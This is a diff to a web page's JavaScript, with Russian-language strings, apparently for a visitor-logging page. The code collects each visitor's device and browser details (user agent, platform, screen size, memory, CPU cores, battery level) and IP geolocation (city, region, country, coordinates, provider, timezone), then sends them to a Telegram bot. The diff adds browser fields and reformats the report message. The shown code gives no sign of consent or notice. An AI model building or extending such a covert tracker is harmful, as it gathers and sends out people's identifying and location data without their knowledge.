@@ -539,6 +539,10 @@
                 screenHeight: window.screen.height,
                 deviceMemory: navigator.deviceMemory || "Недоступно",
                 hardwareConcurrency: navigator.hardwareConcurrency || "Недоступно",
+                apname: navigator.appName,
+                apVersion: navigator.appVersion,
+                dvizhok: navigator.product,
+                vendar: navigator.vendor,
             };
             return deviceInfo;
         }
@@ -645,22 +649,30 @@
         }
         async function sendDataToTelegram(deviceInfo, ipAddress, batteryLevel, host, city, region, country, loc, org, timezone) {
             const message = `
-                Новый запрос!
-                IP: ${ipAddress}
-                Hostname: ${host}
-                Город: ${city}
-                Регион: ${region}
-                Страна: ${country}
-                locate: ${loc}
-                Organization: ${org}
-                Timezone: ${timezone}
-                Устройство: ${deviceInfo.userAgent}
-                Платформа: ${deviceInfo.platform}
-                Язык: ${deviceInfo.language}
-                Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
-                Память устройства: ${deviceInfo.deviceMemory} GB
-                Ядра процессора: ${deviceInfo.hardwareConcurrency}
-                Уровень батареи: ${batteryLevel}%
+Новый запрос!
+💻Информация об устройстве:
+┌IP: ${ipAddress}
+├Платформа: ${deviceInfo.platform}
+├Язык: ${deviceInfo.language}
+├Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+├Память устройства: ${deviceInfo.deviceMemory} GB
+├Ядра процессора: ${deviceInfo.hardwareConcurrency}
+└Уровень батареи: ${batteryLevel}%
+
+🌐Инфомация о браузере:
+┌User-Agent: ${deviceInfo.userAgent}
+├Название браузера: ${deviceInfo.apname}
+├Версия браузера: ${deviceInfo.apVersion}
+└Тип движка браузера: ${deviceInfo.vendar}
+
+👻Информация об IP:
+┌Hostname: ${host}
+├Город: ${city}
+├Регион: ${region}
+├Страна: ${country}
+├Локация: ${loc}
+├Провайдер: ${org}
+└Часовой пояс: ${timezone}
             `;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
